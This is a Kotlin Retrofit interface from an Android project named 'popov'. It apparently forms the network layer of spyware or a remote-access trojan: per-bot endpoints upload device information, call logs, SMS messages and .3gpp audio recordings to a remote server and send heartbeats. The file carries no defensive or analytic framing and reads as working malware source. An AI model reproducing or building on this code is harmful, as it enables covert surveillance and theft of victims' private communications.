package com.github.yohannestz.popov.data.remote

import com.github.yohannestz.popov.data.model.Call
import com.github.yohannestz.popov.data.model.DeviceInfo
import com.github.yohannestz.popov.data.model.GenericReportResponse
import com.github.yohannestz.popov.data.model.GetSmsResponse
import com.github.yohannestz.popov.data.model.SendCallsRequestBody
import com.github.yohannestz.popov.data.model.SendDeviceInfoResponse
import com.github.yohannestz.popov.data.model.SendSmsRequestBody
import com.github.yohannestz.popov.data.model.Sms
import com.github.yohannestz.popov.data.model.UploadResponse
import com.github.yohannestz.popov.util.Constants
import okhttp3.MultipartBody
import okhttp3.RequestBody
import retrofit2.Response
import retrofit2.http.Body
import retrofit2.http.Multipart
import retrofit2.http.POST
import retrofit2.http.Part
import retrofit2.http.Query

interface NetworkService {
    @Multipart
    @POST("upload")
    suspend fun uploadFile(@Part("image\"filename.3gpp\"") file: RequestBody): Response<UploadResponse>

    @Multipart
    @POST(Constants.FILE_UPLOAD_ROUTE)
    suspend fun uploadFile(@Part file: MultipartBody.Part, @Part("sampleFile") name: RequestBody): Response<UploadResponse>

    @POST(Constants.GET_CALLS_ROUTE)
    suspend fun getCallsByBotId(@Query("botId") botId: String): Response<GetSmsResponse>

    @POST(Constants.SEND_DEVICE_INFO_ROUTE)
    suspend fun sendDeviceInfo(@Query("botId") botId: String, @Body deviceInfo: DeviceInfo): Response<SendDeviceInfoResponse>

    @POST(Constants.SEND_CALLS_ROUTE)
    suspend fun sendCalls(@Query("botId") botId: String, @Body sendCallsRequestBody: SendCallsRequestBody): Response<GenericReportResponse>

    @POST(Constants.SEND_SMS_ROUTE)
    suspend fun sendSms(@Query("botId") botId: String, @Body sendSmsRequestBody: SendSmsRequestBody): Response<GenericReportResponse>

    @POST(Constants.SEND_HEARTBEAT_ROUTE)
    suspend fun sendHeartBeat(@Query("botId") botId: String, @Query("date") date: String): Response<GenericReportResponse>
}